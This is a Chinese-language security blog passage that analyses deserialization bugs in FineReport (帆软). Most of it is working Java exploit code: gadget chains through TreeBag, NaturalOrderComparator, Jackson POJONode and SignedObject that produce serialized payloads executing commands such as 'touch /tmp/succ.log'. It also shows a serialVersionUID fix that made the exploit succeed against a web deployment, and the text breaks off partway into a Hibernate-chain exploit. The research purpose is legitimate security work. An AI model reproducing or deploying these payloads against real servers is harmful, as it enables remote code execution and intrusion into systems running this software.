<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method &#123;NAME:<span class="string">&quot;readObject&quot;</span>,CLASSNAME:<span class="string">&quot;com.fr.third.org.apache.commons.collections4.bag.TreeBag&quot;</span>&#125;)</span><br><span class="line">match (sink:Method &#123;NAME:<span class="string">&quot;toString&quot;</span>&#125;)&lt;-[:CALL]-(m1:Method)</span><br><span class="line">where m1.NAME = <span class="string">&#x27;compare&#x27;</span> and m1.IS_SERIALIZABLE</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, <span class="string">&quot;&lt;CALL|ALIAS&quot;</span>,<span class="number">5</span>) <span class="keyword">yield</span> path</span><br><span class="line"><span class="keyword">return</span> * limit <span class="number">205</span></span><br></pre></td></tr></table></figure>

<p>通过查找发现NaturalOrderComparator类是一个符合条件的类，实现了序列化接口，且compare中存在toString方法</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019165637-f6xhw7g.png" alt="image"></p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150513-wl98oqd.png" alt="image"></p>
<p>那么就完美触发整个调用链，调用链子为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">doReadObject:<span class="number">545</span>, AbstractMapBag (com.fr.third.org.apache.commons.collections4.bag)</span><br><span class="line">readObject:<span class="number">137</span>, TreeBag (com.fr.third.org.apache.commons.collections4.bag)</span><br><span class="line"> --doReadObject:<span class="number">545</span>, AbstractMapBag</span><br><span class="line">  --put:<span class="number">538</span>, TreeMap (java.util)</span><br><span class="line">   --compare:<span class="number">1291</span>, TreeMap (java.util)</span><br><span class="line">    --compare:<span class="number">90</span>, NaturalOrderComparator</span><br><span class="line">     --POJONode.getter</span><br><span class="line">     --getObject:<span class="number">180</span>, SignedObject (java.security)</span><br></pre></td></tr></table></figure>

<h3 id="序列化阶段直接触发漏洞"><a href="#序列化阶段直接触发漏洞" class="headerlink" title="序列化阶段直接触发漏洞"></a>序列化阶段直接触发漏洞</h3><p>通过利用链开始构造exp的时候发现在序列化阶段就直接触发漏洞了，原因是treebag.add的时候会直接触发到put方法，而我们exp如果一开始实例化NaturalOrderComparator传入了恶意字节码导致序列化的时候就直接触发漏洞了，那么我们可以通过反射去修改treebag.add的时候put调用的是treemap.put方法，treemap主要是二叉树我们可以拿到root根节点private transient Entry&lt;K,V&gt; root;，在反射获取到内部私有类private transient Entry，通过反射修改key为恶意类即可</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TreeBag</span> <span class="variable">TreeBag</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">TreeBag</span>(NaturalOrderComparator);</span><br><span class="line">      TreeBag.add(<span class="number">1</span>);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">mapField</span> <span class="operator">=</span> TreeBag.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">      mapField.setAccessible(<span class="literal">true</span>); <span class="comment">// 使得 private 字段可访问</span></span><br><span class="line">      <span class="comment">//获取到treemap对象</span></span><br><span class="line">      Map&lt;?, ?&gt; superMap = (Map&lt;?, ?&gt;) mapField.get(TreeBag); <span class="comment">//treemap对象</span></span><br><span class="line">      <span class="comment">//获取treemap中的root属性</span></span><br><span class="line">      <span class="comment">//private transient Entry&lt;K,V&gt; root;</span></span><br><span class="line">      <span class="type">Field</span> <span class="variable">rootField</span> <span class="operator">=</span> superMap.getClass().getDeclaredField(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      rootField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">Object</span> <span class="variable">root</span> <span class="operator">=</span> rootField.get(superMap);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> root.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">      keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      keyField.set(root, jsonNodes);</span><br></pre></td></tr></table></figure>

<h3 id="jackson-本地失败-远程成功"><a href="#jackson-本地失败-远程成功" class="headerlink" title="jackson-本地失败-远程成功"></a>jackson-本地失败-远程成功</h3><p>通过上述分析发现直接构造jackson来进行利用，本地可以，但是web却没有成功</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fr;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.fr.base.ClassComparator;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.jodd.util.NaturalOrderComparator;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.apache.commons.collections4.bag.AbstractMapBag;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.JavassistClassLoader;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.Reflections;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jacksonv_traabag</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;raw_cmd:calc&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        Reflections.setAccessible(valfield);</span><br><span class="line">        valfield.set(badAttributeValueExpException, node);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);<span class="comment">//get</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">NaturalOrderComparator</span> <span class="variable">NaturalOrderComparator</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NaturalOrderComparator</span>();<span class="comment">//tostring</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">TreeBag</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">TreeBag</span>(NaturalOrderComparator);</span><br><span class="line">        TreeBag.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">mapField</span> <span class="operator">=</span> TreeBag.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        mapField.setAccessible(<span class="literal">true</span>); <span class="comment">// 使得 private 字段可访问</span></span><br><span class="line">        <span class="comment">//获取到treemap对象</span></span><br><span class="line">        Map&lt;?, ?&gt; superMap = (Map&lt;?, ?&gt;) mapField.get(TreeBag); <span class="comment">//treemap对象</span></span><br><span class="line">        <span class="comment">//获取treemap中的root属性</span></span><br><span class="line">        <span class="comment">//private transient Entry&lt;K,V&gt; root;</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">rootField</span> <span class="operator">=</span> superMap.getClass().getDeclaredField(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        rootField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">root</span> <span class="operator">=</span> rootField.get(superMap);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> root.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(root, jsonNodes);</span><br><span class="line"><span class="comment">//        ByteArrayOutputStream bao = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//        GZIPOutputStream gzout = new GZIPOutputStream(bao);</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream out = new ObjectOutputStream(gzout);</span></span><br><span class="line"><span class="comment">//        out.writeObject(TreeBag);</span></span><br><span class="line"><span class="comment">//        out.flush();</span></span><br><span class="line"><span class="comment">//        out.close();</span></span><br><span class="line"><span class="comment">//        gzout.close();</span></span><br><span class="line"><span class="comment">//        FileUtils.writeByteArrayToFile(new File(&quot;jackson_202303.ser&quot;), bao.toByteArray());</span></span><br><span class="line">        <span class="comment">//SerializeUtil.serialize(superMap);</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;jackson_202303.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">        out.writeObject(TreeBag);</span><br><span class="line">        out.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line">        SerializeUtil.deserialize(Files.readAllBytes(Paths.get(<span class="string">&quot;jackson_202303.ser&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150835-o79px60.png" alt="image"></p>
<p>但是由于帆软的jar在编译的时候去掉了调试信息，通过JDR工具恢复调试信息，想debug查看什么原因导致jackson利用链无法成功，这里我替换可以debug后的工具到web目录下，这里报错原因是serialVersionUID不一致导致的无法利用，，这里报错serialVersionUID不一致我猜测的原因是我恢复调试信息后类文件发现了变化，导致serialVersionUID不一致</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150901-9c44tp2.png" alt="image"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: com.fr.third.jodd.util.NaturalOrderComparator; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">2885384082642807826</span></span><br></pre></td></tr></table></figure>

<p>通过修改serialVersionUID为-2885384082642807826 ，成功触发漏洞</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;raw_cmd:touch /tmp/succ.log&quot;</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">ctClass.removeMethod(writeReplace);</span><br><span class="line">ctClass.toClass();</span><br><span class="line"><span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">Reflections.setAccessible(valfield);</span><br><span class="line">valfield.set(badAttributeValueExpException, node);</span><br><span class="line">KeyPairGenerator keyPairGenerator;</span><br><span class="line">keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line"><span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line"><span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line"><span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);<span class="comment">//get</span></span><br><span class="line"><span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line"><span class="comment">//NaturalOrderComparator NaturalOrderComparator  = new NaturalOrderComparator();//tostring</span></span><br><span class="line"></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(Class.forName(<span class="string">&quot;com.fr.third.jodd.util.NaturalOrderComparator&quot;</span>)));</span><br><span class="line"><span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">ctNaturalOrderComparator</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.fr.third.jodd.util.NaturalOrderComparator&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">CtField</span> <span class="variable">ctSUID</span> <span class="operator">=</span> ctNaturalOrderComparator.getDeclaredField(<span class="string">&quot;serialVersionUID&quot;</span>);</span><br><span class="line">    ctNaturalOrderComparator.removeField(ctSUID);</span><br><span class="line">&#125;<span class="keyword">catch</span> (javassist.NotFoundException e)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">ctNaturalOrderComparator.addField(CtField.make(<span class="string">&quot;private static final long serialVersionUID = -2885384082642807826L;&quot;</span>, ctNaturalOrderComparator));</span><br><span class="line"></span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Comparator</span> <span class="variable">NaturalOrderComparator</span> <span class="operator">=</span> (Comparator)ctNaturalOrderComparator.toClass(<span class="keyword">new</span> <span class="title class_">JavassistClassLoader</span>()).newInstance();</span><br><span class="line">ctNaturalOrderComparator.defrost();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">TreeBag</span> <span class="variable">TreeBag</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">TreeBag</span>(NaturalOrderComparator);</span><br><span class="line">TreeBag.add(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">mapField</span> <span class="operator">=</span> TreeBag.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">mapField.setAccessible(<span class="literal">true</span>); <span class="comment">// 使得 private 字段可访问</span></span><br><span class="line"><span class="comment">//获取到treemap对象</span></span><br><span class="line">Map&lt;?, ?&gt; superMap = (Map&lt;?, ?&gt;) mapField.get(TreeBag); <span class="comment">//treemap对象</span></span><br><span class="line"><span class="comment">//获取treemap中的root属性</span></span><br><span class="line"><span class="comment">//private transient Entry&lt;K,V&gt; root;</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">rootField</span> <span class="operator">=</span> superMap.getClass().getDeclaredField(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">rootField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">root</span> <span class="operator">=</span> rootField.get(superMap);</span><br><span class="line"><span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> root.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">keyField.set(root, jsonNodes);</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">GZIPOutputStream</span> <span class="variable">gzout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(bao);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(gzout);</span><br><span class="line">out.writeObject(TreeBag);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line">gzout.close();</span><br><span class="line">FileUtils.writeByteArrayToFile(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;jackson_202303.ser&quot;</span>), bao.toByteArray());</span><br></pre></td></tr></table></figure>

<p>成功在tmp下创建了succ.log</p>
<p><img src="/2024/06/10/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%86%E5%8F%B2%E6%B5%85%E6%9E%90/image-20231019150941-md9oqj5.png" alt="image"></p>
<h3 id="hibernat"><a href="#hibernat" class="headerlink" title="hibernat"></a>hibernat</h3><p>后续采用bibernat利用链可以成功触发漏洞，通过二次反序列化来触发hibernat利用链，可以稳定触发</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fr.third.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.jodd.util.NaturalOrderComparator;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.hibernate.EntityMode;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer;</span><br><span 